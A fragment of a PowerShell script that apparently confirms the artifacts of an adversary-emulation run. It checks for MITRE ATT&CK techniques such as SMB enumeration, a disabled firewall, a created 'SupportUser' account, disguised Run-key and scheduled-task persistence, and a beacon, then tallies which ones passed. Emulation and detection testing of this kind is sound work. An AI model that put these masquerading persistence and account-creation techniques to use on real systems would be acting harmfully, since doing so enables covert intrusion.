$results += Check-Artifact "T1018"     "SMB server enum"        "C:\ProgramData\Microsoft\Network\~net.tmp"
$results += Check-Artifact "T1135"     "SMB share enum"         "C:\ProgramData\Microsoft\Network\~net.tmp"
$results += Check-Artifact "T1046"     "Port 445 scan"          "LOG:Port 445"
$results += Check-Artifact "T1562.004" "Firewall disabled"      "LOG:Firewall disabled"
$results += Check-Artifact "T1136.001" "SupportUser created"    "USER:SupportUser"
$results += Check-Artifact "T1547.001" "Run key persistence"    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecHealth"
$results += Check-Artifact "T1053.005" "Task persistence"       "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\SecHealthSvc2"
$results += Check-Artifact "T1074.001" "Beacon completed"       "LOG:Beacon.*completed"

$pass = 0; $fail = 0
foreach ($r in $results) {
    $status = if ($r.Found) { "[PASS]" } else { "[FAIL]" }
    $sizeStr = if ($r.Size) { " ($($r.Size) bytes)" } else { "" }
    Write-Log "$status $($r.TID) $($r.Desc)$sizeStr"
    if ($r.Found) { $pass++ } else { $fail++ }
}

Write-Log "--------------------------"
Write-Log " RESULT: $pass/$($results.Count) techniques confirmed"
if ($fail -gt 0) { Write-Log " $fail technique(s) MISSING — see [FAIL] above" }
Write-Log "=========================="
